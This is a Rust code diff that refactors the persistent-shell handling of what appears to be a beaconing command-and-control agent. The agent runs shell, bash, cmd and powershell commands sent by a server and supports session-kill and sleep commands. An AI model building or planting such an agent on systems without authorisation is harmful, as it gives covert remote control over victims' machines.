@@ -164,6 +164,22 @@ fn default_beacon_interval() -> u64 {
         .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS)
 }
 
+struct ShellState {
+    shell: Option<PersistentShell>,
+    ever_used: bool,
+}
+
+impl ShellState {
+    fn new() -> Self {
+        ShellState { shell: None, ever_used: false }
+    }
+
+    fn kill(&mut self) {
+        self.shell = None;
+        self.ever_used = false;
+    }
+}
+
 #[tokio::main]
 async fn main() {
     let agent_id = get_or_create_agent_id();
@@ -187,7 +203,7 @@ async fn main() {
         .expect("Failed to create HTTPS client");
 
     let mut sys = System::new_all();
-    let shell: Arc<Mutex<Option<PersistentShell>>> = Arc::new(Mutex::new(None));
+    let shell_state: Arc<Mutex<ShellState>> = Arc::new(Mutex::new(ShellState::new()));
 
     loop {
         let bootstrap = session_key.is_none();
@@ -264,7 +280,7 @@ async fn main() {
                                                     &auth_token,
                                                     session_key.as_ref(),
                                                     cmd,
-                                                    Arc::clone(&shell),
+                                                    Arc::clone(&shell_state),
                                                 )
                                                 .await;
                                             }
@@ -351,39 +367,40 @@ async fn run_shell_command(shell: &mut PersistentShell, command: &str) -> String
 }
 
 async fn execute_shell_persistent(
-    shell_guard: &Arc<Mutex<Option<PersistentShell>>>,
+    state_guard: &Arc<Mutex<ShellState>>,
     command: &str,
 ) -> String {
-    let mut guard = shell_guard.lock().await;
+    let mut guard = state_guard.lock().await;
 
-    if guard.is_none() {
-        *guard = PersistentShell::new().await;
+    if guard.shell.is_none() {
+        guard.shell = PersistentShell::new().await;
     }
 
-    let needs_respawn = if let Some(ref mut sh) = *guard {
-        let result = run_shell_command(sh, command).await;
-        if result == "__SHELL_WRITE_FAILED__" {
-            true
-        } else {
-            return result;
-        }
-    } else {
-        return String::from("Failed to spawn shell process");
+    let shell = match guard.shell.as_mut() {
+        Some(s) => s,
+        None => return String::from("Failed to spawn shell process"),
     };
 
-    if needs_respawn {
-        *guard = PersistentShell::new().await;
-        if let Some(ref mut sh) = *guard {
-            let result = run_shell_command(sh, command).await;
-            if result == "__SHELL_WRITE_FAILED__" {
-                return String::from("Shell failed to respawn");
-            }
-            return result;
+    let result = run_shell_command(shell, command).await;
+
+    if result == "__SHELL_WRITE_FAILED__" {
+        if guard.ever_used {
+            guard.shell = None;
+            return String::from("Shell pipe broken. Use 'Eliminate Session' to reset, then reconnect.");
         }
-        return String::from("Failed to respawn shell process");
+        guard.shell = PersistentShell::new().await;
+        if let Some(ref mut sh) = guard.shell {
+            let retry = run_shell_command(sh, command).await;
+            if retry != "__SHELL_WRITE_FAILED__" {
+                guard.ever_used = true;
+                return retry;
+            }
+        }
+        return String::from("Failed to spawn shell process");
     }
 
-    String::from("Unexpected shell state")
+    guard.ever_used = true;
+    result
 }
 
 async fn execute_command(
@@ -393,16 +410,17 @@ async fn execute_command(
     auth_token: &str,
     session_key: Option<&[u8; 32]>,
     cmd: PendingCommand,
-    shell: Arc<Mutex<Option<PersistentShell>>>,
+    shell_state: Arc<Mutex<ShellState>>,
 ) {
     let output = match cmd.command_type.as_str() {
-        "shell" | "bash" | "cmd" => execute_shell_persistent(&shell, &cmd.payload).await,
+        "shell" | "bash" | "cmd" => execute_shell_persistent(&shell_state, &cmd.payload).await,
         "powershell" => execute_powershell(&cmd.payload).await,
         "session_kill" => {
-            let mut guard = shell.lock().await;
-            if let Some(mut sh) = guard.take() {
+            let mut guard = shell_state.lock().await;
+            if let Some(mut sh) = guard.shell.take() {
                 let _ = sh.child.kill().await;
             }
+            guard.kill();
             String::from("Session terminated. Persistent shell killed. Working directory resets on next command.")
         }
         "sleep" => {
